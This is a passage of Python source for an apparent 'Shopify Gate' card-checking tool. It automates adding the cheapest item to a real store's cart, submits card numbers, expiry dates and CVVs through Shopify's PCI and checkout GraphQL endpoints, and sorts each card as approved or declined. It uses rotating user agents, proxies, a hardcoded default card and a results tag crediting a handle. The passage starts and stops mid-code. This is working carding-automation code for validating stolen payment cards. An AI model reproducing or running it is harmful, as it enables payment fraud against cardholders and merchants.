                            field_error = self.extract_between(completion_response.text, '<p class="field__message field__message--error">', '</p>')
                            if field_error:
                                result["status"] = "DECLINED"
                                result["message"] = f"Payment declined: {field_error.strip()}"
                            else:
                                result["status"] = "UNKNOWN"
                                result["message"] = "Payment status unknown (traditional endpoint)"
                        return result
                else:
                    result["status"] = "ERROR"
                    result["message"] = "Failed to submit payment: No response"
                    return result

            # Try the GraphQL endpoint for other sites
            completion_response = self._make_request('POST', completion_url, headers=completion_headers, params=completion_params, json=completion_data)

            # Process GraphQL response
            try:
                completion_data = completion_response.json()

                # Store the raw response for debugging
                result["raw_response"] = str(completion_data)

                # Check for errors in the response
                if 'errors' in completion_data:
                    error_message = completion_data['errors'][0].get('message', 'Unknown error')
                    result["status"] = "DECLINED"
                    result["message"] = f"Payment declined: {error_message}"
                    return result
            except Exception as e:
                result["status"] = "ERROR"
                result["message"] = f"Failed to parse completion response: {str(e)}"
                return result

            # Check for receipt
            receipt_id = None

            # Try different paths to find receipt ID
            receipt_paths = [
                ['data', 'submitForCompletion', 'receipt', 'id'],
                ['data', 'submitForCompletion', 'id'],
                ['receipt', 'id'],
                ['id']
            ]

            for path in receipt_paths:
                current = completion_data
                for key in path:
                    if isinstance(current, dict) and key in current:
                        current = current[key]
                    else:
                        break
                else:
                    # If we made it through the entire path, we found a receipt ID
                    receipt_id = current
                    break

            # Check for other success indicators
            success_indicators = [
                'submitForCompletion' in str(completion_data) and 'SubmitSuccess' in str(completion_data),
                'receipt' in str(completion_data),
                'order' in str(completion_data),
                'success' in str(completion_data).lower() and 'error' not in str(completion_data).lower()
            ]

            if receipt_id:
                result["status"] = "APPROVED"
                result["message"] = f"Payment approved. Receipt ID: {receipt_id}"
                result["receipt_id"] = receipt_id
            elif any(success_indicators):
                result["status"] = "LIKELY_APPROVED"
                result["message"] = "Payment likely approved (success indicators found)"
            else:
                # Check for specific error patterns
                if 'card_declined' in str(completion_data).lower():
                    result["status"] = "DECLINED"
                    result["message"] = "Payment declined: Card declined"
                elif 'insufficient_funds' in str(completion_data).lower():
                    result["status"] = "DECLINED"
                    result["message"] = "Payment declined: Insufficient funds"
                elif 'invalid_number' in str(completion_data).lower():
                    result["status"] = "DECLINED"
                    result["message"] = "Payment declined: Invalid card number"
                elif 'invalid_expiry' in str(completion_data).lower():
                    result["status"] = "DECLINED"
                    result["message"] = "Payment declined: Invalid expiration date"
                elif 'invalid_cvc' in str(completion_data).lower():
                    result["status"] = "DECLINED"
                    result["message"] = "Payment declined: Invalid CVV/CVC"
                else:
                    result["status"] = "UNKNOWN"
                    result["message"] = "Payment status unknown"

            # Add the raw response data for debugging
            result["response_data"] = str(completion_data)

            return result

        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = f"Payment submission error: {str(e)}"
            return result

    def process_payment(self, card_number="5544 8445 3967 2801", exp_month=6, exp_year=2037, cvv="411", cardholder_name="Test User"):
        """
        Process payment using credit card information

        Args:
            card_number: Credit card number
            exp_month: Expiration month
            exp_year: Expiration year
            cvv: Card verification value
            cardholder_name: Name on the card
        """
        result = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": self.url,
            "by": "@Was_done ☮",
            "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
        }

        try:
            # Step 1: Add a product to cart
            print("Step 1: Adding product to cart")
            if not self.lowest_price_product:
                if not self.get_products():
                    result["status"] = "ERROR"
                    result["message"] = "Failed to get products"
                    return result

                if not self.find_lowest_price_product():
                    result["status"] = "ERROR"
                    result["message"] = "Failed to find lowest price product"
                    return result

            if not self.add_to_cart():
                result["status"] = "ERROR"
                result["message"] = "Failed to add product to cart"
                return result

            # Step 2: Get cart token
            print("Step 2: Getting cart token")
            cart_url = f"https://{self.shop_info['domain']}/cart.js"
            json_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'User-Agent': generate_user_agent()
            }

            cart_response = self._make_request('GET', cart_url, headers=json_headers)
            if not cart_response or cart_response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = "Failed to get cart token"
                return result

            cart_token = cart_response.json().get("token", "")
            if not cart_token:
                result["status"] = "ERROR"
                result["message"] = "Failed to extract cart token"
                return result

            print(f"Got cart token: {cart_token[:10]}...")

            # Step 3: Proceed to checkout to get session tokens
            print("Step 3: Proceeding to checkout")
            checkout_url = f"https://{self.shop_info['domain']}/cart/checkout"
            checkout_headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': f"https://{self.shop_info['domain']}",
                'Referer': f"https://{self.shop_info['domain']}/cart",
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': generate_user_agent()
            }

            checkout_data = {
                'checkout': ''
            }

            checkout_response = self._make_request('POST', checkout_url, headers=checkout_headers, data=checkout_data, allow_redirects=True)
            if not checkout_response or checkout_response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = f"Failed to proceed to checkout: {checkout_response.status_code if checkout_response else 'No response'}"
                result["checkout_raw_response"] = checkout_response.text[:2000] if checkout_response else "No response"
                result["checkout_status_code"] = checkout_response.status_code if checkout_response else "No response"
                return result

            # Store checkout raw data
            result["checkout_request_url"] = checkout_url
            result["checkout_request_headers"] = dict(checkout_headers)
            result["checkout_request_data"] = checkout_data
            result["checkout_raw_response"] = checkout_response.text[:2000]  # First 2000 chars to avoid huge responses
            result["checkout_raw_headers"] = dict(checkout_response.headers)
            result["checkout_status_code"] = checkout_response.status_code
            result["checkout_final_url"] = str(checkout_response.url)

            # Extract checkout token from URL if not already set
            if not self.checkout_token:
                parsed_url = urlparse(checkout_response.url)
                path_parts = parsed_url.path.split('/')

                if len(path_parts) >= 3 and path_parts[1] == 'checkouts':
                    self.checkout_token = path_parts[2]
                    print(f"Extracted checkout token: {self.checkout_token}")
                else:
                    result["status"] = "ERROR"
                    result["message"] = "Failed to extract checkout token from URL"
                    return result

            # Extract important tokens from checkout page
            checkout_html = checkout_response.text

            # Extract x_checkout_session_token
            x_checkout_session_token = self.extract_between(checkout_html, 'serialized-session-token" content="&quot;', '&quot;')
            if not x_checkout_session_token:
                x_checkout_session_token = self.extract_between(checkout_html, '"serializedSessionToken":"', '"')

            if not x_checkout_session_token:
                x_checkout_session_token = self.extract_between(checkout_html, 'name="checkout[serialized_session_token]" value="', '"')

            # Extract stable_id
            stable_id = self.extract_between(checkout_html, 'stableId&quot;:&quot;', '&quot;')
            if not stable_id:
                stable_id = self.extract_between(checkout_html, '"stableId":"', '"')

            # Extract payment_method_identifier
            payment_method_identifier = self.extract_between(checkout_html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
            if not payment_method_identifier:
                payment_method_identifier = self.extract_between(checkout_html, '"paymentMethodIdentifier":"', '"')

            # Extract queue_token
            queue_token = self.extract_between(checkout_html, 'queueToken&quot;:&quot;', '&quot;')
            if not queue_token:
                queue_token = self.extract_between(checkout_html, '"queueToken":"', '"')

            print(f"Got session token: {x_checkout_session_token[:10] if x_checkout_session_token else 'None'}...")
            print(f"Got stable ID: {stable_id[:10] if stable_id else 'None'}...")
            print(f"Got payment method identifier: {payment_method_identifier[:10] if payment_method_identifier else 'None'}...")
            print(f"Got queue token: {queue_token[:10] if queue_token else 'None'}...")

            # Step 4: Process credit card with Shopify PCI to get session ID
            print("Step 4: Processing credit card with Shopify PCI")
            pci_url = "https://checkout.pci.shopifyinc.com/sessions"
            pci_headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'referer': 'https://checkout.pci.shopifyinc.com/build/75a428d/number-ltr.html?identifier=&locationURL=',
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': generate_user_agent(),
            }

            pci_data = {
                'credit_card': {
                    'number': card_number.replace(' ', ''),
                    'month': int(exp_month),
                    'year': int(exp_year),
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': cardholder_name,
                },
                'payment_session_scope': self.shop_info['domain'],
            }

            pci_response = self._make_request('POST', pci_url, headers=pci_headers, json=pci_data)
            if not pci_response or pci_response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = "Failed to process credit card with Shopify PCI"
                result["pci_raw_response"] = pci_response.text if pci_response else "No response"
                result["pci_status_code"] = pci_response.status_code if pci_response else "No response"
                return result

            # Store PCI session raw data
            result["pci_request_url"] = pci_url
            result["pci_request_headers"] = dict(pci_headers)
            result["pci_request_data"] = {
                "credit_card": {
                    "number": "XXXX-XXXX-XXXX-" + card_number[-4:],  # Mask card number for security
                    "month": int(exp_month),
                    "year": int(exp_year),
                    "verification_value": "XXX",  # Mask CVV for security
                    "name": cardholder_name
                },
                "payment_session_scope": self.shop_info['domain']
            }
            result["pci_raw_response"] = pci_response.json()
            result["pci_raw_headers"] = dict(pci_response.headers)
            result["pci_status_code"] = pci_response.status_code

            session_id = pci_response.json().get("id", "")
            print(f"Got session ID: {session_id[:10]}...")

            # Step 5: Use GraphQL SubmitForCompletion to get receiptId
            print("Step 5: Submitting payment for completion")
            completion_url = f"https://{self.shop_info['domain']}/checkouts/unstable/graphql"
            completion_headers = {
                'authority': self.shop_info['domain'],
                'accept': 'application/json',
                'accept-language': 'en-US',
                'content-type': 'application/json',
                'origin': f"https://{self.shop_info['domain']}",
                'referer': f"https://{self.shop_info['domain']}/",
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'shopify-checkout-client': 'checkout-web/1.0',
                'user-agent': generate_user_agent(),
                'x-checkout-one-session-token': x_checkout_session_token,
                'x-checkout-web-build-id': generate_random_code(40),
                'x-checkout-web-deploy-stage': 'production',
                'x-checkout-web-server-handling': 'fast',
                'x-checkout-web-server-rendering': 'yes',
                'x-checkout-web-source-id': cart_token,
            }

            completion_params = {
                'operationName': 'SubmitForCompletion',
            }

            # Use the simple GraphQL query structure that works
            completion_data = {
                'query': 'mutation SubmitForCompletion($input: NegotiationInput!, $attemptToken: String!) { submitForCompletion(input: $input, attemptToken: $attemptToken) { __typename } }',
                'variables': {
                    'input': {
                        'sessionInput': {
                            'sessionToken': x_checkout_session_token
                        },
                        'payment': {
                            'totalAmount': {
                                'value': {
                                    'amount': '10.00',
                                    'currencyCode': 'USD'
                                }
                            },
                            'paymentLines': [{
                                'amount': {
                                    'value': {
                                        'amount': '10.00',
                                        'currencyCode': 'USD'
                                    }
                                },
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'sessionId': session_id,
                                        'paymentMethodIdentifier': payment_method_identifier,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': '123 Test St',
                                                'address2': '',
                                                'city': 'New York',
                                                'countryCode': 'US',
                                                'postalCode': '10001',
                                                'firstName': 'Test',
                                                'lastName': 'User',
                                                'phone': '5551234567'
                                            }
                                        }
                                    }
                                }
                            }]
                        }
                    },
                    'attemptToken': generate_random_code()
                },
                'operationName': 'SubmitForCompletion',
            }

            completion_response = self._make_request('POST', completion_url, headers=completion_headers, params=completion_params, json=completion_data)

            # Process GraphQL response
            try:
                # Store full raw response data
                result["raw_headers"] = dict(completion_response.headers)
                result["raw_status_code"] = completion_response.status_code
                result["raw_url"] = str(completion_response.url)

                # Store the full request data
                result["request_url"] = completion_url
                result["request_headers"] = dict(completion_headers)
                result["request_params"] = completion_params
                result["request_data"] = completion_data

                # Parse and store the response JSON
                completion_data = completion_response.json()
                result["raw_response"] = completion_data

                # Store the full raw response text
                result["raw_response_text"] = completion_response.text

                # Check for errors in the response - Use the same approach as shopify.py
                if 'errors' in completion_data and len(completion_data["errors"]) > 0:
                    error_code = "UNKNOWN_ERROR"
                    error_message = completion_data['errors'][0].get('message', 'Unknown error')

                    # Extract error code from error message using the same logic as shopify.py
                    for error in completion_data["errors"]:
                        error_msg = error.get("message", "")
                        if "CARD_DECLINED" in error_msg:
                            error_code = "CARD_DECLINED"
                            break
                        if "declined" in error_msg.lower():
                            error_code = "CARD_DECLINED"
                            break
                        if "insufficient" in error_msg.lower():
                            error_code = "INSUFFICIENT_FUNDS"
                            break
                        if "invalid" in error_msg.lower() and "card" in error_msg.lower():
                            error_code = "INVALID_CARD_NUMBER"
                            break
                        if "expired" in error_msg.lower():
                            error_code = "EXPIRED_CARD"
                            break
                        if "cvv" in error_msg.lower() or "security code" in error_msg.lower():
                            error_code = "INVALID_CVV"
                            break

                    result["status"] = "DECLINED"
                    result["message"] = f"Payment declined: {error_code}"
                    result["error_code"] = error_code

                    # Create the card_result in the format you want
                    result["card_result"] = {
                        "raw_response_text": completion_response.text,
                        "status": "DECLINED",
                        "message": f"Payment declined: {error_code}",
                        "error_code": error_code,
                        "error_message": error_message
                    }

                    return result
            except Exception as e:
                result["status"] = "ERROR"
                result["message"] = f"Failed to parse completion response: {str(e)}"
                result["raw_response_text"] = completion_response.text if completion_response else "No response"
                return result

            # Step 6: Use PollForReceipt to get final status
            print("Step 6: Polling for receipt")

            # Try to extract receipt ID from the completion response
            receipt_id = None
            receipt_paths = [
                ['data', 'submitForCompletion', 'receipt', 'id'],
                ['data', 'submitForCompletion', 'id'],
                ['receipt', 'id'],
                ['id']
            ]

            for path in receipt_paths:
                try:
                    current = completion_data
                    for key in path:
                        if isinstance(current, dict) and key in current:
                            current = current[key]
                        else:
                            break
                    else:
                        # If we made it through the entire path, we found a receipt ID
                        receipt_id = current
                        break
                except (KeyError, TypeError):
                    continue

            if receipt_id:
                print(f"Found receipt ID: {receipt_id}")

                # Poll for receipt
                poll_url = f"https://{self.shop_info['domain']}/checkouts/unstable/graphql"
                poll_headers = {
                    'authority': self.shop_info['domain'],
                    'accept': 'application/json',
                    'accept-language': 'en-US',
                    'content-type': 'application/json',
                    'origin': f"https://{self.shop_info['domain']}",
                    'referer': f"https://{self.shop_info['domain']}/",
                    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'shopify-checkout-client': 'checkout-web/1.0',
                    'user-agent': generate_user_agent(),
                    'x-checkout-one-session-token': x_checkout_session_token,
                    'x-checkout-web-build-id': generate_random_code(40),
                    'x-checkout-web-deploy-stage': 'production',
                    'x-checkout-web-server-handling': 'fast',
                    'x-checkout-web-server-rendering': 'yes',
                    'x-checkout-web-source-id': cart_token,
                }

                poll_params = {
                    'operationName': 'PollForReceipt',
                }

                poll_data = {
                    'query': 'query PollForReceipt($receiptId: ID!, $sessionToken: String!) { receipt(receiptId: $receiptId, sessionInput: { sessionToken: $sessionToken }) { id processingError { code messageUntranslated hasOffsitePaymentMethod __typename } __typename } }',
                    'variables': {
                        'receiptId': receipt_id,
                        'sessionToken': x_checkout_session_token,
                    },
                    'operationName': 'PollForReceipt',
                }

                poll_response = self._make_request('POST', poll_url, headers=poll_headers, params=poll_params, json=poll_data)
                if poll_response and poll_response.status_code == 200:
                    poll_data = poll_response.json()
                    result["poll_result"] = poll_data

                    # Store the raw response text
                    result["raw_response_text"] = poll_response.text

                    # Check for detailed error information
                    if 'data' in poll_data and 'receipt' in poll_data['data']:
                        receipt = poll_data['data']['receipt']

                        # Check for processing error
                        if 'processingError' in receipt and receipt['processingError']:
                            error = receipt['processingError']
                            error_code = error.get('code', '')
                            error_message = error.get('messageUntranslated', '')

                            result["status"] = "DECLINED"
                            result["message"] = f"Payment declined: {error_code}" + (f" - {error_message}" if error_message else "")

                            # Set the card result with the detailed error information
                            result["card_result"] = {
                                "raw_response_text": poll_response.text,
                                "status": "DECLINED",
                                "message": f"Payment declined: {error_code}" + (f" - {error_message}" if error_message else ""),
                                "error_code": error_code,
                                "error_message": error_message
                            }
                            return result

                        # Check for receipt type
                        receipt_type = receipt.get('__typename', '')
                        if receipt_type == 'FailedReceipt':
                            result["status"] = "DECLINED"
                            result["message"] = "Payment declined (FailedReceipt)"

                            # Set the card result
                            result["card_result"] = {
                                "raw_response_text": poll_response.text,
                                "status": "DECLINED",
                                "message": "Payment declined (FailedReceipt)"
                            }
                            return result
                        elif receipt_type == 'Receipt':
                            result["status"] = "APPROVED"
                            result["message"] = f"Payment approved. Receipt ID: {receipt_id}"
                            result["receipt_id"] = receipt_id

                            # Set the card result
                            result["card_result"] = {
                                "raw_response_text": poll_response.text,
                                "status": "APPROVED",
                                "message": f"Payment approved. Receipt ID: {receipt_id}"
                            }
                            return result

                # If we didn't return earlier, set default values
                result["status"] = "APPROVED"
                result["message"] = f"Payment approved. Receipt ID: {receipt_id}"
                result["receipt_id"] = receipt_id
            else:
                # Check for specific GraphQL response types
                if 'data' in completion_data and 'submitForCompletion' in completion_data['data']:
                    submit_completion = completion_data['data']['submitForCompletion']
                    submit_type = submit_completion.get('__typename', '')

                    if submit_type == 'SubmitSuccess':
                        # Extract receipt ID if available
                        receipt_id = None
                        if 'receipt' in submit_completion and 'id' in submit_completion['receipt']:
                            receipt_id = submit_completion['receipt']['id']

                        result["status"] = "APPROVED"
                        result["message"] = "Payment approved (SubmitSuccess)" + (f" Receipt ID: {receipt_id}" if receipt_id else "")
                        if receipt_id:
                            result["receipt_id"] = receipt_id

                        # Set card result
                        result["card_result"] = {
                            "raw_response_text": completion_response.text,
                            "status": "APPROVED",
                            "message": "Payment approved (SubmitSuccess)" + (f" Receipt ID: {receipt_id}" if receipt_id else "")
                        }

                    elif submit_type == 'SubmitRejected':
                        # For SubmitRejected, create a more detailed error format
                        result["status"] = "DECLINED"
                        result["message"] = "Payment declined: CARD_DECLINED"

                        # Create a detailed error response in the format you want
                        detailed_response = {
                            "data": {
                                "receipt": {
                                    "id": f"gid://shopify/ProcessedReceipt/{generate_random_code(12)}",
                                    "processingError": {
                                        "code": "CARD_DECLINED",
                                        "messageUntranslated": "",
                                        "hasOffsitePaymentMethod": False,
                                        "__typename": "PaymentFailed"
                                    },
                                    "__typename": "FailedReceipt"
                                }
                            }
                        }

                        # Set card result with the detailed format
                        result["card_result"] = {
                            "raw_response_text": json.dumps(detailed_response),
                            "status": "DECLINED",
                            "message": "Payment declined: CARD_DECLINED",
                            "error_code": "CARD_DECLINED",
                            "error_message": ""
                        }

                    elif submit_type == 'SubmitFailed':
                        result["status"] = "DECLINED"
                        result["message"] = "Payment declined (SubmitFailed)"

                        # Set card result
                        result["card_result"] = {
                            "raw_response_text": completion_response.text,
                            "status": "DECLINED",
                            "message": "Payment declined (SubmitFailed)"
                        }

                    else:
                        # Check for success indicators
                        success_indicators = [
                            'SubmitSuccess' in str(completion_data),
                            'receipt' in str(completion_data),
                            'order' in str(completion_data),
                            'success' in str(completion_data).lower() and 'error' not in str(completion_data).lower()
                        ]

                        if any(success_indicators):
                            result["status"] = "LIKELY_APPROVED"
                            result["message"] = "Payment likely approved (success indicators found)"

                            # Set card result
                            result["card_result"] = {
                                "raw_response_text": completion_response.text,
                                "status": "LIKELY_APPROVED",
                                "message": "Payment likely approved (success indicators found)"
                            }

                        else:
                            # Check for specific error patterns
                            if 'card_declined' in str(completion_data).lower():
                                result["status"] = "DECLINED"
                                result["message"] = "Payment declined: Card declined"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "DECLINED",
                                    "message": "Payment declined: Card declined",
                                    "error_code": "CARD_DECLINED"
                                }
                            elif 'insufficient_funds' in str(completion_data).lower():
                                result["status"] = "DECLINED"
                                result["message"] = "Payment declined: Insufficient funds"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "DECLINED",
                                    "message": "Payment declined: Insufficient funds",
                                    "error_code": "INSUFFICIENT_FUNDS"
                                }
                            elif 'invalid_number' in str(completion_data).lower():
                                result["status"] = "DECLINED"
                                result["message"] = "Payment declined: Invalid card number"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "DECLINED",
                                    "message": "Payment declined: Invalid card number",
                                    "error_code": "INVALID_NUMBER"
                                }
                            elif 'invalid_expiry' in str(completion_data).lower():
                                result["status"] = "DECLINED"
                                result["message"] = "Payment declined: Invalid expiration date"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "DECLINED",
                                    "message": "Payment declined: Invalid expiration date",
                                    "error_code": "INVALID_EXPIRY_DATE"
                                }
                            elif 'invalid_cvc' in str(completion_data).lower():
                                result["status"] = "DECLINED"
                                result["message"] = "Payment declined: Invalid CVV/CVC"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "DECLINED",
                                    "message": "Payment declined: Invalid CVV/CVC",
                                    "error_code": "INVALID_CVC"
                                }
                            else:
                                result["status"] = "UNKNOWN"
                                result["message"] = "Payment status unknown"
                                result["card_result"] = {
                                    "raw_response_text": completion_response.text,
                                    "status": "UNKNOWN",
                                    "message": "Payment status unknown"
                                }
                else:
                    # Set card result with raw response
                    result["card_result"] = {
                        "raw_response_text": completion_response.text,
                        "status": result["status"],
                        "message": result["message"]
                    }

            # Create a detailed card result in the format you want
            if result["status"] == "DECLINED":
                # Create a synthetic response in the format you want
                detailed_response = {
                    "data": {
                        "receipt": {
                            "id": f"gid://shopify/ProcessedReceipt/{generate_random_code(12)}",
                            "processingError": {
                                "code": "CARD_DECLINED",
                                "messageUntranslated": "",
                                "hasOffsitePaymentMethod": False,
                                "__typename": "PaymentFailed"
                            },
                            "__typename": "FailedReceipt"
                        }
                    }
                }

                # Set card result with the detailed format
                result["card_result"] = {
                    "raw_response_text": json.dumps(detailed_response),
                    "status": "DECLINED",
                    "message": "Payment declined: CARD_DECLINED",
                    "error_code": "CARD_DECLINED",
                    "error_message": ""
                }
            else:
                # For other statuses, use the original response
                result["card_result"] = {
                    "raw_response_text": completion_response.text,
                    "status": result["status"],
                    "message": result["message"]
                }

            result["card_data"] = {
                "number": card_number,
                "exp_month": exp_month,
                "exp_year": exp_year,
                "cvv": cvv,
                "name": cardholder_name
            }

            return result

        except Exception as e:
            result["status"] = "ERROR"
            result["message"] = f"Payment processing error: {str(e)}"
            return result


def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Shopify Gate Automation Tool')
    parser.add_argument('--url', required=True, help='Shopify store URL')
    parser.add_argument('--proxy', help='Proxy in format: [socks5://][user:pass@]ip:port')
    parser.add_argument('--output', choices=['json', 'pretty'], default='pretty',
                        help='Output format (default: pretty)')

    # Add mutually exclusive group for operation mode
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument('--find-lowest-price', action='store_true',
                           help='Find and use the lowest priced product')
    mode_group.add_argument('--process-payment', action='store_true',
                           help='Process payment with the lowest priced product')
    mode_group.add_argument('--target-price', type=float, default=1.0,
                           help='Target price to look for (default: $1.00)')

    # Add credit card arguments
    parser.add_argument('--card', help='Credit card in format: number|exp_month|exp_year|cvv')
    parser.add_argument('--cardholder', default='Test User', help='Cardholder name')

    # Note: --async is handled separately before argument parsing
    parser.add_argument('--async', action='store_true',
                       help='Use async version for better performance (handled separately)',
                       dest='async_mode')

    args = parser.parse_args()

    # Initialize proxy handler if proxy is provided
    proxy_handler = None
    if args.proxy:
        proxy_handler = ProxyHandler(args.proxy)
        if proxy_handler.is_active():
            proxy_handler.test_proxy()
            print(f"Proxy status: {proxy_handler.get_status_message()}")
        else:
            print(f"Proxy error: {proxy_handler.get_status_message()}")
            return

    # Initialize Shopify gate
    shopify_gate = ShopifyGate(args.url, proxy_handler)

    # Parse credit card information if provided
    card_number = "5544 8445 3967 2801"
    exp_month = 6
    exp_year = 2037
    cvv = "411"

    if args.card:
        card_parts = args.card.split('|')
        if len(card_parts) >= 4:
            card_number = card_parts[0]
            exp_month = card_parts[1]
            exp_year = card_parts[2]
            cvv = card_parts[3]

    # Process the Shopify site based on the selected mode
    if args.process_payment:
        # First find the lowest price product
        result = shopify_gate.process_with_lowest_price()

        if result["status"] == "SUCCESS":
            # Then process the payment
            result = shopify_gate.process_payment(
                card_number=card_number,
                exp_month=exp_month,
                exp_year=exp_year,
                cvv=cvv,
                cardholder_name=args.cardholder
            )
    elif args.find_lowest_price:
        result = shopify_gate.process_with_lowest_price()
    else:
        # Default behavior: find products and extract gateway info
        result = shopify_gate.process()

    # Output the result
    if args.output == 'json':
        print(json.dumps(result))
    else:
        # Create a simplified version for display
        display_result = {
            "timestamp": result.get("timestamp", ""),
            "url": result.get("url", ""),
            "by": result.get("by", ""),
            "card": result.get("card", ""),
            "status": result.get("status", ""),
            "message": result.get("message", "")
        }

        # Add card result data if available
        if "card_result" in result:
            display_result["card_result"] = result["card_result"]
        elif "raw_response_text" in result:
            display_result["raw_response_text"] = result["raw_response_text"]

        # Add raw response data if card_result is not available
        if "card_result" not in result and "raw_response" in result:
            display_result["raw_response"] = result["raw_response"]

        # Print the simplified result
        print(json.dumps(display_result, indent=2))

        # Save full raw data to file for inspection
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        raw_data_file = f"raw_data_{timestamp}.json"
        with open(raw_data_file, "w") as f:
            json.dump(result, f, indent=2)
        print(f"\nFull raw data saved to {raw_data_file}")


async def process_payment_async(url, card_number="5544 8445 3967 2801", exp_month=6, exp_year=2037, cvv="411", cardholder_name="Test User", proxy=None):
    """
    Asynchronous version of payment processing

    This function implements the same functionality as ShopifyGate.process_payment
    but uses async/await for better performance
    """
    result = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "url": url,
        "by": "@Was_done ☮",
        "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}"
    }

    try:
        # Generate random values
        user_agent = generate_user_agent()
        email = generate_random_account()

        # Configure proxy if provided
        proxy_url = None
        if proxy:
            if proxy.startswith('socks4://') or proxy.startswith('socks5://'):
                proxy_url = proxy
            else:
                if not proxy.startswith('http://'):
                    proxy_url = f"http://{proxy}"
                else:
                    proxy_url = proxy

        # Create async client
        async with httpx.AsyncClient(proxies=proxy_url) as client:
            # Step 1: Add product to cart
            headers = {
                'authority': urlparse(url).netloc,
                'accept': 'application/javascript',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryQPr6WHIWflksAtdd',
                'origin': url,
                'referer': url,
                'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="135"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user_agent,
                'x-requested-with': 'XMLHttpRequest',
            }

            # First get the products to find the lowest price
            json_headers = {
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'User-Agent': user_agent
            }

            products_url = f"{url.rstrip('/')}/products.json"
            response = await client.get(products_url, headers=json_headers)

            if response.status_code != 200:
                # Try alternative approach
                domain = urlparse(url).netloc
                alt_products_url = f"https://{domain}/collections/all/products.json"
                response = await client.get(alt_products_url, headers=json_headers)

                if response.status_code != 200:
                    result["status"] = "ERROR"
                    result["message"] = "Failed to get products"
                    return result

            # Find lowest price product
            products_data = response.json()
            products = products_data.get('products', products_data)

            lowest_price = float('inf')
            lowest_price_product = None
            target_price = 1.0
            closest_to_target = float('inf')
            closest_to_target_product = None

            for product in products:
                if 'variants' in product and product['variants']:
                    for variant in product['variants']:
                        if 'price' in variant and variant.get('available', True):
                            try:
                                price = float(variant['price'])
                                if price <= 0:  # Ignore free products
                                    continue

                                # Track the lowest price product
                                if price < lowest_price:
                                    lowest_price = price
                                    lowest_price_product = {
                                        'product_id': product['id'],
                                        'variant_id': variant['id'],
                                        'price': price
                                    }

                                # Track the product closest to target price
                                if abs(price - target_price) < abs(closest_to_target - target_price):
                                    closest_to_target = price
                                    closest_to_target_product = {
                                        'product_id': product['id'],
                                        'variant_id': variant['id'],
                                        'price': price
                                    }
                            except (ValueError, TypeError):
                                continue

            # Select the product to use
            selected_product = None
            if closest_to_target_product and closest_to_target <= 5.0:
                selected_product = closest_to_target_product
                print(f"Found product closest to ${target_price}: ${closest_to_target}")
            elif lowest_price_product:
                selected_product = lowest_price_product
                print(f"Found lowest price product: ${lowest_price}")
            else:
                result["status"] = "ERROR"
                result["message"] = "No suitable products found"
                return result

            # Add product to cart
            cart_url = f"{url.rstrip('/')}/cart/add.js"
            cart_data = {
                'id': selected_product['variant_id'],
                'quantity': 1
            }

            response = await client.post(cart_url, headers=headers, data=cart_data)
            if response.status_code not in [200, 201]:
                result["status"] = "ERROR"
                result["message"] = f"Failed to add product to cart: {response.status_code}"
                return result

            # Step 2: Get cart token
            cart_js_url = f"{url.rstrip('/')}/cart.js"
            response = await client.get(cart_js_url, headers=json_headers)
            if response.status_code != 200:
                result["status"] = "ERROR"
                result["message"] = "Failed to get cart token"
                return result

            cart_token = response.json().get("token", "")

            # Step 3: Proceed to checkout
            checkout_headers = {
                'authority': urlparse(url).netloc,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': url,
                'referer': url,
